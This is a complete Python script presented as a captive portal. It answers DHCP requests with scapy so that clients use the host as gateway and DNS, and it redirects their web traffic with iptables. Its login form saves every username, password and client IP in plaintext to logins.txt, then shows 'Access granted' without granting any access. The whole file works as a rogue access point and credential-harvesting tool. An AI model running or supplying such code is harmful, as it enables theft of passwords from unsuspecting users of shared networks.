from scapy.all import *
import subprocess
import os
import threading
import signal
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from datetime import datetime

# הגדרות IP ו־DHCP
OFFERED_IP = "192.168.1.100"
SERVER_IP = "192.168.1.1"
SUBNET_MASK = "255.255.255.0"
LEASE_TIME = 3600
LOG_FILE = "logins.txt"

# אחסון sessionים וזיהוי
session_store = {}

def kill_python_on_port_80():
    try:
        # Step 1: Run `sudo lsof -i :80`
        result = subprocess.run(
            ['sudo', 'lsof', '-i', ':80'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output = result.stdout.splitlines()

        # Step 2: Search for lines with "python" processes
        for line in output:
            if line.startswith("python"):
                parts = line.split()
                pid = int(parts[1])
                print(f"[+] Found python process with PID {pid} listening on port 80")

                try:
                    os.kill(pid, signal.SIGTERM)
                    print(f"[+] Sent SIGTERM to PID {pid}")
                except PermissionError:
                    print(f"[!] Permission denied to kill PID {pid}")
                except ProcessLookupError:
                    print(f"[!] Process {pid} no longer exists")
                
                # Optional: Force kill if still alive after short wait
                import time
                time.sleep(1)
                try:
                    os.kill(pid, 0)  # Check if still alive
                    os.kill(pid, signal.SIGKILL)
                    print(f"[+] Sent SIGKILL to PID {pid}")
                except ProcessLookupError:
                    print(f"[✓] Process {pid} already terminated")

    except Exception as e:
        print(f"[!] Error: {e}")

def check_root():
    if os.geteuid() != 0:
        print("[!] Must run as root. Use sudo.")
        exit(1)

def assign_ip_to_ap(interface):
    print(f"[*] Assigning {SERVER_IP}/24 to {interface}...")
    subprocess.run(["ip", "addr", "flush", "dev", interface])
    subprocess.run(["ip", "addr", "add", f"{SERVER_IP}/24", "dev", interface], check=True)
    subprocess.run(["ip", "link", "set", interface, "up"], check=True)

def enable_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
        status = f.read().strip()
    if status != "1":
        print("[*] Enabling IP forwarding...")
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    else:
        print("[*] IP forwarding already enabled.")

def redirect_http_to_local(interface):
    print("[*] Redirecting HTTP traffic to captive portal...")
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface,
                    "-p", "tcp", "--dport", "80", "-j", "DNAT",
                    "--to-destination", f"{SERVER_IP}:80"], check=True)

def block_unauthenticated(interface):
    print("[*] Blocking all traffic by default on interface:", interface)
    subprocess.run(["iptables", "-I", "FORWARD", "-i", interface, "-j", "REJECT"], check=True)

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""
            <html><body>
            <h2>Welcome to the Captive Portal</h2>
            <form action='/login' method='POST'>
                Username: <input type='text' name='user'><br>
                Password: <input type='password' name='pass'><br>
                <input type='submit' value='Login'>
            </form>
            </body></html>
        """)

    def do_POST(self):
        if self.path == '/login':
            ip = self.client_address[0]
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            fields = parse_qs(post_data)
            user = fields.get("user", [""])[0]
            passwd = fields.get("pass", [""])[0]

            # לוג התחברות
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] IP: {ip}, Username: {user}, Password: {passwd}\n"
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)
            print(f"[+] Login saved: {user}@{ip}")

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h2>Access granted</h2></body></html>")

def start_http_server():
    server = HTTPServer((SERVER_IP, 80), CaptivePortalHandler)
    print("[*] Captive portal HTTP server running on port 80")
    threading.Thread(target=server.serve_forever, daemon=True).start()

def handle_dhcp(pkt):
    if not pkt.haslayer(DHCP):
        return

    mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr
    dhcp_type = None

    for opt in pkt[DHCP].options:
        if opt[0] == 'message-type':
            dhcp_type = opt[1]

    if dhcp_type == 1:  # DHCPDISCOVER
        print(f"[+] DHCPDISCOVER from {mac}, xid={xid}")
        session_store[mac] = xid
        send_response(mac, xid, chaddr, msg_type="offer")

    elif dhcp_type == 3:  # DHCPREQUEST
        if mac not in session_store:
            print(f"[!] DHCPREQUEST from {mac} without matching OFFER")
            return
        print(f"[+] DHCPREQUEST from {mac}, xid={xid}")
        send_response(mac, xid, chaddr, msg_type="ack")

def send_response(mac, xid, chaddr, msg_type="offer"):
    ether = Ether(dst=mac, src=get_if_hwaddr(INTERFACE))
    ip = IP(src=SERVER_IP, dst="255.255.255.255")
    udp = UDP(sport=67, dport=68)
    bootp = BOOTP(op=2, yiaddr=OFFERED_IP, siaddr=SERVER_IP, chaddr=chaddr, xid=xid, flags=0x8000)
    dhcp = DHCP(options=[
        ("message-type", msg_type),
        ("server_id", SERVER_IP),
        ("subnet_mask", SUBNET_MASK),
        ("router", SERVER_IP),
        ("name_server", SERVER_IP),
        ("lease_time", LEASE_TIME),
        ("url", f"http://{SERVER_IP}"),
        "end"
    ])
    packet = ether / ip / udp / bootp / dhcp
    sendp(packet, iface=INTERFACE, verbose=0)
    print(f"[>] Sent DHCP {msg_type.upper()} to {mac}")

def start_captive_portal(interface):
    global INTERFACE
    INTERFACE = interface
    kill_python_on_port_80()
    check_root()
    assign_ip_to_ap(interface)
    enable_ip_forwarding()
    block_unauthenticated(interface)
    redirect_http_to_local(interface)
    start_http_server()
    print(f"[*] Listening for DHCP on {interface}...")
    sniff(filter="udp and (port 67 or 68)", iface=interface, prn=handle_dhcp)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: sudo python captive_portal.py <interface>")
        exit(1)
    start_captive_portal(sys.argv[1])
